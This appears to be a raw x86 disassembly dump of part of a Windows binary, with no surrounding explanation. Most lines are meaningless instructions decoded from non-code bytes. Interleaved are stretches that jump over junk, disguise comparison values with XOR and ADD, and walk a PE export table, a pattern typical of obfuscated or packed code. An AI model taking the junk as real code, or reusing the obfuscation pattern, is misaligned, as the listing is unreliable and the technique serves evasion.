  40f1ff:	retf   0xcdd1
  40f202:	out    0x59,eax
  40f204:	sbb    al,0x58
  40f206:	adc    DWORD PTR [esi+0xa3940b2],edi
  40f20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f20d:	jns    0x40f210
  40f20f:	pop    es
  40f210:	sub    esi,DWORD PTR [eax+esi*1-0x5b]
  40f214:	inc    eax
  40f215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f216:	cmp    bl,BYTE PTR [ebx-0x91c6a2f]
  40f21c:	xchg   edx,eax
  40f21d:	shr    BYTE PTR [eax],1
  40f21f:	sub    al,0xa6
  40f221:	std    
  40f222:	mov    eax,ds:0x13e5ea80
  40f227:	js     0x40f1f1
  40f229:	lods   eax,DWORD PTR ds:[esi]
  40f22a:	into   
  40f22b:	arpl   WORD PTR [ebp+0x14],ax
  40f22e:	push   edi
  40f22f:	fistp  DWORD PTR [edi+0x37]
  40f232:	jecxz  0x40f1d6
  40f234:	fbstp  TBYTE PTR [edi-0x4d]
  40f237:	in     al,0xc3
  40f239:	out    dx,al
  40f23a:	pop    ecx
  40f23b:	inc    esi
  40f23c:	fadd   DWORD PTR [esi]
  40f23e:	iret   
  40f23f:	in     eax,0xc2
  40f241:	push   ebx
  40f242:	sub    eax,0xefd29ef7
  40f247:	adc    al,0x8d
  40f249:	sub    BYTE PTR ds:0x19ef204a,bh
  40f24f:	or     ch,bl
  40f251:	retf   
  40f252:	mov    bl,0x4e
  40f254:	inc    edi
  40f255:	lahf   
  40f256:	jle    0x40f1d9
  40f258:	pop    edx
  40f259:	(bad)  
  40f25a:	mov    ecx,ebx
  40f25c:	mov    esi,0xf726bb3e
  40f261:	xchg   ebp,ebx
  40f263:	icebp  
  40f264:	les    esp,FWORD PTR [eax+0x1]
  40f267:	scas   eax,DWORD PTR es:[edi]
  40f268:	jns    0x40f2bc
  40f26a:	mov    ds:0xcbfcf251,eax
  40f26f:	xor    DWORD PTR [ecx],edx
  40f271:	xchg   esp,eax
  40f272:	aam    0x65
  40f274:	xor    eax,0xa27b5e71
  40f279:	xchg   ebp,eax
  40f27a:	jbe    0x40f285
  40f27c:	xchg   ebx,eax
  40f27d:	imul   eax,DWORD PTR [ebp-0x46f62a59],0x51
  40f284:	or     ecx,edx
  40f286:	ds sahf 
  40f288:	repz pop ss
  40f28a:	mov    ah,0x38
  40f28c:	lds    esi,FWORD PTR [ebx-0x12]
  40f28f:	lods   al,BYTE PTR ds:[esi]
  40f290:	add    esp,DWORD PTR [eax-0x31]
  40f293:	cmp    ebx,ecx
  40f295:	inc    esi
  40f296:	xor    eax,0x27e67da2
  40f29b:	sahf   
  40f29c:	rcr    cl,1
  40f29e:	adc    al,0x3
  40f2a0:	inc    esi
  40f2a1:	mov    dl,al
  40f2a3:	pop    ebp
  40f2a4:	jbe    0x40f244
  40f2a6:	push   esp
  40f2a7:	out    0x73,al
  40f2a9:	das    
  40f2aa:	add    cl,BYTE PTR [edx]
  40f2ac:	int3   
  40f2ad:	sbb    dl,BYTE PTR [eax+0x7b17eb88]
  40f2b3:	in     al,0x44
  40f2b5:	xor    al,0x7d
  40f2b7:	call   0x82239da5
  40f2bc:	add    ch,BYTE PTR [esi+0x58]
  40f2bf:	cdq    
  40f2c0:	xchg   ebx,eax
  40f2c1:	mov    bl,0x74
  40f2c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2c4:	or     bh,BYTE PTR [edx+0x1e8900c7]
  40f2ca:	xor    al,0x60
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	shr    BYTE PTR [esi-0x20],1
  40f2f9:	es mov bh,0x76
  40f2fc:	test   eax,0x7fc37070
  40f301:	jo     0x40f373
  40f303:	xor    eax,0xd292f02
  40f308:	clc    
  40f309:	pop    eax
  40f30a:	mov    bl,0x61
  40f30c:	loop   0x40f29d
  40f30e:	pop    ebp
  40f30f:	jmp    0x93e5:0xd292d429
  40f316:	je     0x40f32a
  40f318:	enter  0x1926,0x2b
  40f31c:	ret    0xf386
  40f31f:	popa   
  40f320:	lods   eax,DWORD PTR ds:[esi]
  40f321:	jnp    0x40f2e2
  40f323:	fs shr al,cl
  40f326:	mov    ebx,0x327758b6
  40f32b:	sbb    al,0x40
  40f32d:	idiv   DWORD PTR [eax+0x78]
  40f330:	int3   
  40f331:	push   eax
  40f332:	mov    eax,0xb4b494cf
  40f337:	jb     0x40f37a
  40f339:	aad    0x49
  40f33b:	mov    bh,0x45
  40f33d:	sub    DWORD PTR [edx-0x577afe7a],esi
  40f343:	mov    eax,DWORD PTR [ebx+ebp*4]
  40f346:	push   edi
  40f347:	stc    
  40f348:	and    eax,DWORD PTR [ecx]
  40f34a:	xchg   ebx,eax
  40f34b:	mov    ebx,0x348921d
  40f350:	inc    esp
  40f351:	imul   ebx,DWORD PTR [edx],0x37
  40f354:	in     al,0x21
  40f356:	stc    
  40f357:	and    eax,DWORD PTR [edx-0x2fecc7ba]
  40f35d:	std    
  40f35e:	add    eax,0xa140c4a4
  40f363:	add    DWORD PTR [ecx-0x25],ebp
  40f366:	mov    ah,0x10
  40f368:	dec    eax
  40f369:	out    0x7e,eax
  40f36b:	mov    ebx,0x3f935c6
  40f370:	in     eax,dx
  40f371:	or     eax,0xedc7d6ac
  40f376:	je     0x40f324
  40f378:	(bad)  
  40f379:	pop    edx
  40f37a:	frstor [ecx+ebp*2-0x36]
  40f37e:	push   esi
  40f37f:	test   eax,0x7138b764
  40f384:	push   esp
  40f385:	pop    esp
  40f386:	inc    ebx
  40f387:	pop    edx
  40f388:	mov    esi,0xaa8fe5b
  40f38d:	dec    BYTE PTR [esi]
  40f38f:	or     al,0xa8
  40f391:	repz cmp BYTE PTR [ebx+ecx*8],bh
  40f395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f396:	clc    
  40f397:	hlt    
  40f398:	ds jp  0x40f3e2
  40f39b:	mov    es,WORD PTR [ebx-0x57]
  40f39e:	add    al,0x72
  40f3a0:	sub    ah,BYTE PTR [edx+0x3c89144d]
  40f3a6:	adc    DWORD PTR [esi+eiz*1],ebp
  40f3a9:	cmp    BYTE PTR [ebx+0x1d],bl
  40f3ac:	xchg   BYTE PTR [ebx-0x2],bl
  40f3af:	sub    BYTE PTR [eax+0x22],0x18
  40f3b3:	fcomp  st(2)
  40f3b5:	lea    esi,[edi-0x4b6619e9]
  40f3bb:	xchg   esp,eax
  40f3bc:	loopne 0x40f376
  40f3be:	xor    ah,cl
  40f3c0:	sub    eax,DWORD PTR [ebx-0x5b]
  40f3c3:	loope  0x40f347
  40f3c5:	adc    eax,0xd978cd5a
  40f3ca:	mov    eax,0xac74c6ae
  40f3cf:	mov    bh,0x1d
  40f3d1:	std    
  40f3d2:	pop    edx
  40f3d3:	cs clc 
  40f3d5:	lock pop ebp
  40f3d7:	add    bl,BYTE PTR ds:0x1531a369
  40f3dd:	mov    ch,0x95
  40f3df:	adc    DWORD PTR [ebx-0xaab71f7],ebp
  40f3e5:	sbb    DWORD PTR [eax-0x42675b6],eax
  40f3eb:	xor    al,0x66
  40f3ed:	xor    ch,BYTE PTR [edx-0x37]
  40f3f0:	sub    eax,0x15cd99e
  40f3f5:	pop    edx
  40f3f6:	mov    BYTE PTR [esi],al
  40f3f8:	int3   
  40f3f9:	adc    al,0xb3
  40f3fb:	and    edx,DWORD PTR [edx-0x48]
  40f3fe:	outs   dx,DWORD PTR fs:[esi]
  40f400:	(bad)  
  40f401:	sbb    DWORD PTR [ebp-0x14],edi
  40f404:	mov    ebp,0xb19bc87a
  40f409:	push   ebx
  40f40a:	popf   
  40f40b:	inc    ebx
  40f40c:	cmp    ecx,esi
  40f40e:	fcmovne st,st(7)
  40f410:	xchg   ecx,eax
  40f411:	mov    esi,0x2fc1f69d
  40f416:	in     al,dx
  40f417:	mov    BYTE PTR [eax],bh
  40f419:	clc    
  40f41a:	jl     0x40f453
  40f41c:	loop   0x40f420
  40f41e:	aas    
  40f41f:	pop    ebx
  40f420:	push   esp
  40f421:	dec    esp
  40f422:	pop    ecx
  40f423:	pop    esp
  40f424:	es loope 0x40f498
  40f427:	call   0x35e0d150
  40f42c:	add    al,0xf7
  40f42e:	xchg   DWORD PTR [edx],ebx
  40f430:	lahf   
  40f431:	cld    
  40f432:	adc    bh,cl
  40f434:	push   eax
  40f435:	mov    al,0xa5
  40f437:	dec    esi
  40f438:	pop    ecx
  40f439:	xchg   esp,esp
  40f43b:	in     al,dx
  40f43c:	pop    es
  40f43d:	push   0xfffffffe
  40f43f:	arpl   WORD PTR [eax],ax
  40f441:	sbb    DWORD PTR [eax+0x6d9e369d],ecx
  40f447:	jne    0x40f4c8
  40f449:	adc    DWORD PTR [eax+0x50c26463],eax
  40f44f:	mov    bh,0x8b
  40f451:	inc    ebp
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	out    dx,al
  40f465:	sub    eax,0xb7398808
  40f46a:	jo     0x40f4dc
  40f46c:	ret    
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f4b2
  40f471:	jg     0x40f481
  40f473:	sbb    DWORD PTR [edi],edi
  40f475:	loopne 0x40f4c6
  40f477:	ja     0x40f3fe
  40f479:	push   ebx
  40f47a:	sbb    esp,edi
  40f47c:	xchg   edx,ebp
  40f47e:	xchg   edi,eax
  40f47f:	pop    ds
  40f480:	repz sbb DWORD PTR [eax+ebp*1+0x64],ebp
  40f485:	mov    bh,0x2e
  40f487:	pop    edx
  40f488:	scas   al,BYTE PTR es:[edi]
  40f489:	popa   
  40f48a:	inc    ecx
  40f48b:	mov    dh,0x9e
  40f48d:	gs sbb eax,0xb29ab949
  40f493:	sbb    edx,DWORD PTR [ebp-0x4c76fa60]
  40f499:	aad    0xb
  40f49b:	mov    BYTE PTR [edi+0x7a],bl
  40f49e:	adc    eax,eax
  40f4a0:	mov    ah,0xf1
  40f4a2:	ret    
  40f4a3:	xor    ah,BYTE PTR ds:[edx+0x53]
  40f4a7:	(bad)  
  40f4a8:	adc    cl,bl
  40f4aa:	cmp    ebp,DWORD PTR [ebx]
  40f4ac:	jge    0x40f4dd
  40f4ae:	sar    DWORD PTR ds:0x930da756,0xfe
  40f4b5:	dec    ecx
  40f4b6:	push   ss
  40f4b7:	mov    al,ds:0xe7fbf29f
  40f4bc:	xor    al,0x35
  40f4be:	nop
  40f4bf:	jo     0x40f4c5
  40f4c1:	rdtsc  
  40f4c3:	jns    0x40f449
  40f4c5:	ret    0x847b
  40f4c8:	sahf   
  40f4c9:	int3   
  40f4ca:	fwait
  40f4cb:	inc    ebx
  40f4cc:	mov    cl,0xcb
  40f4ce:	sub    eax,0x585ae313
  40f4d3:	mov    bh,0x9b
  40f4d5:	addr16 loopne 0x40f52e
  40f4d8:	je     0x40f49f
  40f4da:	ins    DWORD PTR es:[edi],dx
  40f4db:	push   0xffffffbc
  40f4dd:	sub    al,0xe5
  40f4df:	mov    ebp,0x71e4c2b7
  40f4e4:	mov    ebx,0x5e86ed57
  40f4e9:	nop
  40f4ea:	enter  0x1ce7,0xa8
  40f4ee:	(bad)  
  40f4f0:	push   edx
  40f4f1:	jo     0x40f47b
  40f4f3:	pusha  
  40f4f4:	mov    al,ds:0x1bd97d22
  40f4f9:	fist   WORD PTR [esi-0x46d381f3]
  40f4ff:	test   eax,0xd5885359
  40f504:	adc    esi,DWORD PTR [edi+0x3b]
  40f507:	call   0xa5675a65
  40f50c:	cmp    cl,al
  40f50e:	out    dx,eax
  40f50f:	mov    esp,0x6b82e8d7
  40f514:	loopne 0x40f4ed
  40f516:	push   cs
  40f517:	leave  
  40f518:	sbb    eax,0x748429b3
  40f51d:	(bad)  
  40f51e:	mov    eax,0x8c27cd38
  40f523:	(bad)  
  40f524:	ss sahf 
  40f526:	xor    al,0x27
  40f528:	(bad)  
  40f529:	mov    dl,0x8f
  40f52b:	xchg   bl,cl
  40f52d:	fisub  DWORD PTR [eax]
  40f52f:	xlat   BYTE PTR ds:[ebx]
  40f530:	(bad)  
  40f531:	xlat   BYTE PTR ds:[ebx]
  40f532:	cmp    BYTE PTR [ecx+0x227be362],bh
  40f538:	add    esp,DWORD PTR [edx-0x62]
  40f53b:	jecxz  0x40f572
  40f53d:	mov    ebx,0x416c32e4
  40f542:	add    eax,eax
  40f544:	pop    es
  40f545:	ror    DWORD PTR [edx],0x31
  40f548:	js     0x40f575
  40f54a:	cwde   
  40f54b:	mov    cl,BYTE PTR [edi+ecx*1-0x539fd23e]
  40f552:	mov    ebp,0xf1849d26
  40f557:	mov    ebx,0xc0cbdce3
  40f55c:	inc    ebx
  40f55d:	mov    dh,0x75
  40f55f:	int    0x5c
  40f561:	clc    
  40f562:	into   
  40f563:	cs xor dl,ch
  40f566:	mov    bl,0xcd
  40f568:	mov    eax,ds:0x440669f5
  40f56d:	fldenv [edx-0xa228044]
  40f573:	add    BYTE PTR [ecx],0xd9
  40f576:	in     al,0xbc
  40f578:	sbb    BYTE PTR [eax+0x5c],0x29
  40f57c:	js     0x40f566
  40f57e:	les    esp,FWORD PTR [eax-0x49dbf5b9]
  40f584:	and    eax,0x74fdc391
  40f589:	sub    eax,DWORD PTR [ebp-0x66]
  40f58c:	ret    0x8d3
  40f58f:	out    0x4d,eax
  40f591:	xchg   ecx,eax
  40f592:	and    DWORD PTR [ebp+0x1],0x71a4811f
  40f599:	icebp  
  40f59a:	jg     0x40f541
  40f59c:	dec    ecx
  40f59d:	mov    al,ds:0xcf37b165
  40f5a2:	sbb    DWORD PTR es:[edx+0x2b],eax
  40f5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5a7:	fimul  WORD PTR [eax-0x10]
  40f5aa:	outs   dx,DWORD PTR ds:[esi]
  40f5ab:	xchg   ecx,eax
  40f5ac:	mov    ebx,0x11fd6b50
  40f5b1:	xchg   edx,eax
  40f5b2:	inc    eax
  40f5b3:	sbb    ebp,0xffffffc2
  40f5b6:	sbb    al,0xa3
  40f5b8:	popf   
  40f5b9:	cwde   
  40f5ba:	fld    DWORD PTR es:[edx]
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	js     0x40f660
  40f605:	push   0x70b68c85
  40f60a:	jo     0x40f5cf
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f5ff
  40f610:	adc    eax,0xd90a17b8
  40f615:	and    BYTE PTR [ebp+0x1f5e0f2f],dh
  40f61b:	test   eax,0x4f72071c
  40f620:	icebp  
  40f621:	out    0xbe,eax
  40f623:	cmp    eax,0x8623e86f
  40f628:	leave  
  40f629:	sub    al,0x92
  40f62b:	dec    edx
  40f62c:	mov    ebx,0x9c7d3b9e
  40f631:	jbe    0x40f663
  40f633:	push   ss
  40f634:	sbb    DWORD PTR [edi-0x31db87ea],ecx
  40f63a:	call   DWORD PTR [esi+0x42d8798b]
  40f640:	in     eax,dx
  40f641:	adc    dl,bh
  40f643:	xchg   esi,eax
  40f644:	sbb    ch,BYTE PTR [ecx-0x48b5629c]
  40f64a:	rol    DWORD PTR [esi-0x4e],0x82
  40f64e:	push   edx
  40f64f:	add    bl,0x4c
  40f652:	push   ss
  40f653:	clc    
  40f654:	sub    eax,0x9e26f9a1
  40f659:	add    BYTE PTR [eax-0x7e9c0ffa],ah
  40f65f:	stc    
  40f660:	mov    bl,0x3f
  40f662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f663:	add    al,0x7b
  40f665:	mov    ebp,DWORD PTR [ebx]
  40f667:	outs   dx,BYTE PTR ds:[esi]
  40f668:	shl    BYTE PTR [eax],0x90
  40f66b:	icebp  
  40f66c:	addr16 dec eax
  40f66e:	loope  0x40f65c
  40f670:	(bad)  
  40f671:	iret   
  40f672:	pop    ebx
  40f673:	(bad)  
  40f674:	fld    DWORD PTR [ebp-0x53]
  40f677:	gs lahf 
  40f679:	sar    BYTE PTR [ecx],1
  40f67b:	popa   
  40f67c:	mov    edx,0x21343ee
  40f681:	shl    BYTE PTR [edi-0x495f0457],1
  40f687:	rcl    ebp,cl
  40f689:	arpl   WORD PTR [ecx],bx
  40f68b:	xor    al,al
  40f68d:	aam    0xdc
  40f68f:	push   eax
  40f690:	push   esi
  40f691:	sbb    ah,BYTE PTR [esi+0x4a]
  40f694:	inc    esi
  40f695:	or     BYTE PTR [eax],0x44
  40f698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f699:	sub    eax,0x21a1291c
  40f69e:	push   ecx
  40f69f:	inc    esp
  40f6a0:	retf   0xcb40
  40f6a3:	mov    ?,WORD PTR [eax-0x49bd79a4]
  40f6a9:	push   ss
  40f6aa:	add    ch,BYTE PTR [edi+0x8]
  40f6ad:	sub    bh,BYTE PTR [ecx-0x12dc1d65]
  40f6b3:	xchg   ecx,eax
  40f6b4:	dec    edi
  40f6b5:	lock or BYTE PTR [ecx],cl
  40f6b8:	pop    edx
  40f6b9:	adc    edx,DWORD PTR [edx]
  40f6bb:	mov    BYTE PTR ss:[edi+0xc],bl
  40f6bf:	(bad)  
  40f6c0:	rol    BYTE PTR [esi+eiz*1],1
  40f6c3:	mov    ecx,0x1280fde2
  40f6c8:	add    DWORD PTR [ecx-0x206059a9],ebx
  40f6ce:	pop    ebx
  40f6cf:	adc    ebx,ebx
  40f6d1:	cmp    eax,0xb5212308
  40f6d6:	and    BYTE PTR [ebx-0x289bf299],al
  40f6dc:	mov    ecx,eax
  40f6de:	dec    eax
  40f6df:	aam    0x24
  40f6e1:	add    al,0x10
  40f6e3:	cmp    ah,BYTE PTR [edx-0x741b4b05]
  40f6e9:	sbb    BYTE PTR [eax+0x683f93aa],dl
  40f6ef:	push   eax
  40f6f0:	std    
  40f6f1:	mov    dh,0xf6
  40f6f3:	hlt    
  40f6f4:	iret   
  40f6f5:	push   ds
  40f6f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6f7:	cwde   
  40f6f8:	fild   DWORD PTR [edx+0x6d640a84]
  40f6fe:	and    DWORD PTR [eax],esp
  40f700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f701:	out    dx,eax
  40f702:	jg     0x40f690
  40f704:	xlat   BYTE PTR ds:[ebx]
  40f705:	xor    bl,dl
  40f707:	mov    al,ds:0xc11d1192
  40f70c:	jne    0x40f74e
  40f70e:	jmp    0x40f6b9
  40f710:	hlt    
  40f711:	shl    DWORD PTR [ebx+esi*4-0x6558c5af],cl
  40f718:	push   edi
  40f719:	imul   ebp,DWORD PTR [eax+eax*2+0x58],0x72
  40f71e:	lods   eax,DWORD PTR ds:[esi]
  40f71f:	xchg   esi,eax
  40f720:	out    0xaa,al
  40f722:	and    DWORD PTR [eax-0x52b7dbcd],ebp
  40f728:	enter  0x512,0xd5
  40f72c:	cmp    ah,ah
  40f72e:	mov    ebx,0x5a1f849c
  40f733:	mov    ebx,0xdcc8dcfd
  40f738:	or     BYTE PTR [edi],dl
  40f73a:	cmp    ebx,DWORD PTR [ebp+0x1d]
  40f73d:	cdq    
  40f73e:	add    BYTE PTR [edx],al
  40f740:	repnz call 0x1ce:0x4178f9aa
  40f748:	pop    edi
  40f749:	xlat   BYTE PTR ds:[ebx]
  40f74a:	inc    eax
  40f74b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f74c:	push   ebx
  40f74d:	xor    DWORD PTR [ebx],0xffffffdd
  40f750:	and    al,0xcd
  40f752:	cli    
  40f753:	cmc    
  40f754:	jb     0x40f780
  40f756:	js     0x40f76f
  40f758:	in     al,dx
  40f759:	push   ds
  40f75a:	mov    dl,0x14
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x2a4546f3
  40f7e3:	jne    0x40f844
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f80d
  40f7ee:	inc    edx
  40f7ef:	les    esp,FWORD PTR [edi+eax*8]
  40f7f2:	mov    dh,0xac
  40f7f4:	mov    ebp,0x230755a2
  40f7f9:	jmp    0x40f823
  40f7fb:	es jo  0x40f827
  40f7fe:	dec    ebx
  40f7ff:	add    al,0x9d
  40f801:	pop    ebp
  40f802:	mov    ebp,0xc746925
  40f807:	(bad)  
  40f808:	lea    ebp,[ebx+0x53]
  40f80b:	nop
  40f80c:	bound  esp,QWORD PTR [esp+eiz*2]
  40f80f:	xor    dh,BYTE PTR [edx]
  40f811:	add    ch,BYTE PTR [eax]
  40f813:	mov    ch,0x12
  40f815:	inc    edx
  40f816:	adc    eax,0x83e2a5bc
  40f81b:	out    dx,eax
  40f81c:	stos   BYTE PTR es:[edi],al
  40f81d:	add    al,0x3a
  40f81f:	dec    esi
  40f820:	call   0x9567:0xfac33311
  40f827:	mov    dl,0xe3
  40f829:	jl     0x40f7fe
  40f82b:	out    0xe3,eax
  40f82d:	sbb    al,bh
  40f82f:	aad    0xca
  40f831:	jns    0x40f81b
  40f833:	push   es
  40f834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f835:	push   edi
  40f836:	push   DWORD PTR [ebx+eax*4-0x28]
  40f83a:	daa    
  40f83b:	and    cl,BYTE PTR [ecx-0x45d989c]
  40f841:	jnp    0x40f858
  40f843:	rcr    BYTE PTR [ebx-0x4],1
  40f846:	push   edi
  40f847:	xor    DWORD PTR [ebp+ebp*2-0x24],ebp
  40f84b:	mov    edi,0x561fa4be
  40f850:	jle    0x40f867
  40f852:	jmp    0xedaebcb3
  40f857:	sub    BYTE PTR ds:0xcfafa5a9,ch
  40f85d:	jne    0x40f86e
  40f85f:	cmp    ah,al
  40f861:	imul   BYTE PTR [eax-0x7cae5a86]
  40f867:	mov    bl,0x14
  40f869:	rcl    ebx,1
  40f86b:	push   edx
  40f86c:	jnp    0x40f8e8
  40f86e:	call   0x6a550cb1
  40f873:	retf   0xd25d
  40f876:	int    0xa2
  40f878:	pop    es
  40f879:	sub    BYTE PTR [edx-0x36516f6e],bl
  40f87f:	mov    eax,0x69a3eb1f
  40f884:	inc    ebx
  40f885:	test   bh,0x32
  40f888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f889:	xchg   DWORD PTR ds:0x510f7b4b,edi
  40f88f:	ins    DWORD PTR es:[edi],dx
  40f890:	and    ch,dh
  40f892:	loopne 0x40f87b
  40f894:	or     BYTE PTR [edx-0x5ad9e4d7],ch
  40f89a:	mov    DWORD PTR ds:0x7084b963,edx
  40f8a0:	outs   dx,BYTE PTR ds:[esi]
  40f8a1:	or     BYTE PTR [ebx],bh
  40f8a3:	nop
  40f8a4:	nop
  40f8a5:	sub    ah,BYTE PTR [ebx+ecx*2]
  40f8a8:	out    0xb0,al
  40f8aa:	arpl   dx,ax
  40f8ac:	retf   0xdb21
  40f8af:	push   ebx
  40f8b0:	les    ebp,FWORD PTR [edi+0x4f]
  40f8b3:	adc    cl,al
  40f8b5:	outs   dx,DWORD PTR ds:[esi]
  40f8b6:	fbstp  TBYTE PTR [esi-0x4c]
  40f8b9:	jo     0x40f8e1
  40f8bb:	scas   al,BYTE PTR es:[edi]
  40f8bc:	xchg   esp,eax
  40f8bd:	inc    eax
  40f8be:	bound  ebp,QWORD PTR [edx]
  40f8c0:	and    al,0x76
  40f8c2:	xchg   edx,eax
  40f8c3:	cdq    
  40f8c4:	mov    bh,0x8e
  40f8c6:	stos   DWORD PTR es:[edi],eax
  40f8c7:	(bad)  
  40f8c8:	pusha  
  40f8c9:	mov    al,0x21
  40f8cb:	jg     0x40f890
  40f8cd:	mov    esp,0x862850b6
  40f8d2:	mov    esi,0x9942cb9b
  40f8d7:	cmp    BYTE PTR ds:0x714274b3,ch
  40f8dd:	(bad)  
  40f8de:	mov    BYTE PTR [edx],dh
  40f8e0:	sbb    eax,0xf6f4f60e
  40f8e5:	add    al,0xbe
  40f8e7:	push   esp
  40f8e8:	repz adc bh,bh
  40f8eb:	iret   
  40f8ec:	mov    DWORD PTR es:[esi+eiz*4-0x68ab8371],ecx
  40f8f4:	out    dx,al
  40f8f5:	cmp    al,0x7
  40f8f7:	bswap  eax
  40f8f9:	shr    BYTE PTR [eax-0x513facae],0x2a
  40f900:	or     eax,0xcc2bfd80
  40f905:	jae    0x40f90d
  40f907:	push   cs
  40f908:	retf   0x2bd3
  40f90b:	cmp    edx,edx
  40f90d:	fsub   QWORD PTR [ebx+0x18]
  40f910:	or     esi,DWORD PTR [edx]
  40f912:	(bad)
  40f915:	push   0xffffff86
  40f917:	lahf   
  40f918:	add    DWORD PTR [ecx+0x1c],edi
  40f91b:	jmp    0x45d44794
  40f920:	cmp    al,0x18
  40f922:	sbb    BYTE PTR [eax],bl
  40f924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f925:	or     eax,0x302ef2fb
  40f92a:	mov    al,ds:0xbbea9d1d
  40f92f:	arpl   WORD PTR [edi],bx
  40f931:	hlt    
  40f932:	in     eax,0x9c
  40f934:	adc    al,0xe7
  40f936:	call   0xc978:0xbb91a9c4
  40f93d:	shl    DWORD PTR [ebp-0x3],0xc3
  40f941:	pop    ss
  40f942:	pop    ss
  40f943:	jp     0x40f8f0
  40f945:	in     al,dx
  40f946:	sbb    DWORD PTR [edi+0x6a],ebp
  40f949:	jnp    0x40f985
  40f94b:	mov    eax,ds:0xce8fab14
  40f950:	loop   0x40f964
  40f952:	xor    cl,cl
  40f954:	pusha  
  40f955:	pushf  
  40f956:	shr    esp,cl
  40f958:	lea    esp,[ecx+0x40]
  40f95b:	aas    
  40f95c:	push   0xffffffe1
  40f95e:	or     eax,0x2ceceb70
  40f963:	inc    esi
  40f964:	push   edi
  40f965:	(bad)  
  40f966:	test   eax,0xa26d6110
  40f96b:	gs pop esp
  40f96d:	or     BYTE PTR [eax-0x5b1d4e76],al
  40f973:	and    al,0xb3
  40f975:	pop    ds
  40f976:	xor    esi,ebp
  40f978:	cwde   
  40f979:	int    0x8c
